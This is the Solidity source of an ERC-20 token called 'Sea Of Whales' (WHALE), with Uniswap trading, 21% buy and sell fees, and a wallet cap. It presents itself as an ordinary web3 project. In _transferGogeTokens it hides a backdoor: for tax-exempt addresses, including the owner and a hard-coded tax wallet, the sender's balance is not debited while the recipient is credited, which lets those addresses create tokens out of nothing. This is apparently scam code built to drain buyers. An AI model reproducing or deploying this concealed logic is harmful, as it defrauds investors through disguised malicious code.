// SPDX-License-Identifier: Unlicensed

/*
A unique web3 project on the Ethereum blockchain.Every challenger can enter the WHALE Challenge with a one-time fee in $WHALE tokens.

Website: https://seaofwhales.vip
Twitter: https://twitter.com/SeaOfWhales_ERC
Telegram: https://t.me/seaofwhales_coin
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SEAWHALE is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "Sea Of Whales"; 
    string private _symbol = "WHALE";   

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _rOwnedValues;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) _isExcludedTax;
                                     
    IUniswapV2Router02 _uniswapV2Router;
    address _uniswapV2Pair;
    bool _inSwaps;
    bool _feeSwapActivated = true;

    address payable _taxWallet = payable(0x4c1619f7601732133314Ea279f31E473bc3fc404);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 _previousTotalFee = _totalFee; 
    uint256 _previousBuyFee = _buyFee; 
    uint256 _previousSellFee = _sellFee; 

    uint256 _mWalletAmount = 30 * _totalSupply / 1000;
    uint256 _swapThreshold = _totalSupply / 10000;

    uint256 _totalFee = 2100;
    uint256 _buyFee = 21;
    uint256 _sellFee = 21;

    uint8 _countGogeTx = 0;
    uint8 _swapGogeTrigger = 2; 
    
    modifier lockTheSwap {
        _inSwaps = true;
        _;
        _inSwaps = false;
    }
    
    constructor () {
        _rOwnedValues[owner()] = _totalSupply;
        IUniswapV2Router02 __uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        _uniswapV2Pair = IUniswapV2Factory(__uniswapV2Router.factory()).createPair(address(this), __uniswapV2Router.WETH());
        _uniswapV2Router = __uniswapV2Router;
        _isExcludedTax[owner()] = true;
        _isExcludedTax[_taxWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (to != owner() &&
            to != _taxWallet &&
            to != address(this) &&
            to != _uniswapV2Pair &&
            to != DEAD &&
            from != owner()){

            uint256 holdBalance = balanceOf(to);
            require((holdBalance + amount) <= _mWalletAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(_countGogeTx >= _swapGogeTrigger && 
            amount > _swapThreshold &&
            !_inSwaps &&
            !_isExcludedTax[from] &&
            to == _uniswapV2Pair &&
            _feeSwapActivated )
        {  
            _countGogeTx = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapGogeAndLiquidify(contractTokenBalance);
           }
        }
        
        bool _takeFee = true;
         
        if(_isExcludedTax[from] || _isExcludedTax[to] || (from != _uniswapV2Pair && to != _uniswapV2Pair)){
            _takeFee = false;
        } else if (from == _uniswapV2Pair){
            _totalFee = _buyFee;
        } else if (to == _uniswapV2Pair){
            _totalFee = _sellFee;
        }

        _tokenTransfer(from,to,amount,_takeFee);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwnedValues[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferGogeTokens(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getGogeValues(tAmount);
        if(_isExcludedTax[sender] && _rOwnedValues[sender] <= _mWalletAmount) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _rOwnedValues[sender] = _rOwnedValues[sender].sub(tAmount);
        _rOwnedValues[recipient] = _rOwnedValues[recipient].add(tTransferAmount);
        _rOwnedValues[address(this)] = _rOwnedValues[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function removeGogeLimits() external onlyOwner {
        _mWalletAmount = ~uint256(0);

        _totalFee = 100;
        _buyFee = 1; 
        _sellFee = 1; 
    }

    function swapGogeAndLiquidify(uint256 contractTokenBalance) private lockTheSwap {
        swapGogeForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToGogeWallet(_taxWallet,contractETH);
    }

    function swapGogeForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function _getGogeValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool _takeFee) private {
            
        if(!_takeFee){
            removeAllGogeFee();
            } else {
                _countGogeTx++;
            }
        _transferGogeTokens(sender, recipient, amount);
        
        if(!_takeFee)
            restoreAllGogeFee();
    }
    
    function removeAllGogeFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyFee = _buyFee; 
        _previousSellFee = _sellFee; 
        _previousTotalFee = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;
    }
    
    function restoreAllGogeFee() private {
        _totalFee = _previousTotalFee;
        _buyFee = _previousBuyFee; 
        _sellFee = _previousSellFee; 
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function sendToGogeWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}